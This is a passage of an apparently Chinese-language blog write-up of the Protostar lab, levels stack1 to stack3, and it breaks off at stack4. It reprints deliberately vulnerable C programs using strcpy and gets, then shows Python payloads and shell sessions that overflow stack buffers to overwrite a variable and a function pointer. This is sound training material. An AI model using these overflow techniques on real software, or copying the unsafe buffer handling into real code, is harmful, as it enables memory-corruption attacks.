&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; modified;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(argc &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      errx(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;please specify an argument&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  modified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  strcpy(buffer, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(modified &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61626364&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you have correctly got the variable to the right value&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Try again, you got 0x%08x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, modified);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;p&gt;这里需要使  &lt;code&gt;modified == 0x61626364&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;需要注意小端序&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ more stack1.py 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; * &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x64\x63\x62\x61&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;padding + modified&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ python stack1.py &amp;gt; st1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ /opt/protostar/bin/stack1 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;&amp;lt; st1&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;you have correctly got the variable to the right value
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;stack-two&#34;&gt;Stack Two&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Stack2 looks at environment variables, and how they can be set.&lt;/p&gt;
&lt;p&gt;This level is at /opt/protostar/bin/stack2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; modified;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;variable;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  variable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getenv(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GREENIE&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(variable &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      errx(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;please set the GREENIE environment variable&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  modified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  strcpy(buffer, variable);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(modified &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0d0a0d0a&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you have correctly modified the variable&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Try again, you got 0x%08x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, modified);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;p&gt;主要是设置环境变量的问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ more stack2.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; * &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x0a\x0d\x0a\x0d&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;padding + modified&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ python stack2.py &amp;gt; st2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ export GREENIE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat st2&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ echo $GREENIE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ /opt/protostar/bin/stack2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;you have correctly modified the variable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;stack-three&#34;&gt;Stack Three&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;both gdb and objdump is your friend you determining where the win() function lies in memory.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This level is at /opt/protostar/bin/stack3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;win&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;code flow successfully changed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp)();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  gets(buffer);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(fp) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;calling function pointer, jumping to 0x%08x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, fp);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      fp();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;p&gt;重点是找到 &lt;code&gt;void win()&lt;/code&gt; 在哪&lt;/p&gt;
&lt;p&gt;可以使用 &lt;code&gt;objdump -t&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;-t&lt;/p&gt;
&lt;p&gt;&amp;ndash;syms&lt;/p&gt;
&lt;p&gt;​	Print the symbol table entries of the file. This is similar to the information provided by the nm program, although the display format is different.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ objdump -t /opt/protostar/bin/stack3 | grep win
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;08048424&lt;/span&gt; g     F .text	&lt;span style=&#34;color:#ae81ff&#34;&gt;00000014&lt;/span&gt;              win
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可见是 &lt;code&gt;0x08048424&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ more stack3.py 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; * &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;win &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x24\x84\x04\x08&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;padding + win&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ python stack3.py | /opt/protostar/bin/stack3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;calling &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; pointer, jumping to 0x08048424
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;code flow successfully changed
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;stack-four&#34;&gt;Stack Four&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Stack4 takes a look at overwriting saved EIP and standard buffer overflows.&lt;/p&gt;
&lt;p&gt;This level is at /opt/protostar/bin/stack4&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A variety of introductory papers into buffer overflows may help.&lt;/li&gt;
&lt;li&gt;gdb lets you do “run &amp;lt; input”&lt;/li&gt;
&lt;li&gt;EIP is not directly after the end of buffer, compiler padding can also increase the size.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
